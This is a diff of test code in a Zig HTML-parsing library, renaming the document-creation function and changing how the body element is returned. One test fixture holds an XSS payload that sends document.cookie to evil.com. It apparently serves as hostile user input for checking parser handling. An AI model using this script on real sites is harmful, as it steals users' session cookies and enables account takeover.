@@ -356,8 +356,8 @@ pub fn matchesTagName(element: *z.HTMLElement, tag_name: []const u8) bool {
 }
 
 test "matchesTagName" {
-    const doc = try z.parseFromString("<p></p><br>");
-    const body_elt = try z.bodyElement(doc);
+    const doc = try z.createDocFromString("<p></p><br>");
+    const body_elt = z.bodyElement(doc).?;
     const p = z.firstElementChild(body_elt).?;
     const br = z.nextElementSibling(p).?;
 
@@ -398,10 +398,10 @@ pub const WhitespacePreserveTagSet = struct {
 test "whitespacepreservedTagSet" {
     const allocator = testing.allocator;
 
-    const doc = try z.parseFromString("<div></div><pre></pre><code></code><textarea></textarea><script></script><style></style><p></p>");
+    const doc = try z.createDocFromString("<div></div><pre></pre><code></code><textarea></textarea><script></script><style></style><p></p>");
     defer z.destroyDocument(doc);
 
-    const body_elt = try z.bodyElement(doc);
+    const body_elt = z.bodyElement(doc).?;
 
     const expected = [_]struct { tag: z.HtmlTag, preserved: bool }{
         .{ .tag = .div, .preserved = false },
@@ -466,10 +466,10 @@ pub fn isVoidElement(element: *z.HTMLElement) bool {
 
 test "isVoidElement" {
     const allocator = testing.allocator;
-    const doc = try z.parseFromString("<br><img src=\"img\"><input><p></p>");
+    const doc = try z.createDocFromString("<br><img src=\"img\"><input><p></p>");
     defer z.destroyDocument(doc);
 
-    const body_elt = try z.bodyElement(doc);
+    const body_elt = z.bodyElement(doc).?;
 
     const expected = [_]struct { tag: z.HtmlTag, void: bool }{
         .{ .tag = .br, .void = true },
@@ -658,10 +658,10 @@ test "tagFromElement vs tagName vs qualifiedName allocated/zc" {
 
 test "flow - user input to browser output" {
     const user_submitted_html = "<custom-widget><script>document.location = 'https://evil.com?data=' + document.cookie;</script></custom-widget>";
-    const doc = try z.parseFromString(user_submitted_html);
+    const doc = try z.createDocFromString(user_submitted_html);
     defer z.destroyDocument(doc);
 
-    const body_elt = try z.bodyElement(doc);
+    const body_elt = z.bodyElement(doc).?;
     const widget_elt = z.firstElementChild(body_elt).?;
 
     // custom element <=> not in standard HTML enum
